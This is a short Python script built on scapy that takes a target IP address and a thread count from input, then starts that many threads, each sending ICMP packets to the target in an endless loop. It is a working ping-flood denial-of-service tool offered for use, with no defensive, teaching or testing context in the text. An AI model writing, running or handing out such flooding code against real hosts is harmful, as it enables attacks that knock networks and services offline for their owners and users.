from scapy.all import IP, ICMP, send
import threading

target_ip = input("Target IP: ")
size = int(input("Size: "))
check = 0

def ping_flood():
    global target_ip
    global check
    while True:
        try:
            packet = IP(dst=target_ip) / ICMP()
            send(packet, verbose=False)
            check = check + size
            if check % size == 0:
                print(f"Successful {check} pings")
        except Exception as e:
            print(f"Error: {e}")

thread_list = []
for i in range(size):
    thread = threading.Thread(target=ping_flood)
    thread_list.append(thread)

for thread in thread_list:
    thread.start()

for thread in thread_list:
    thread.join()
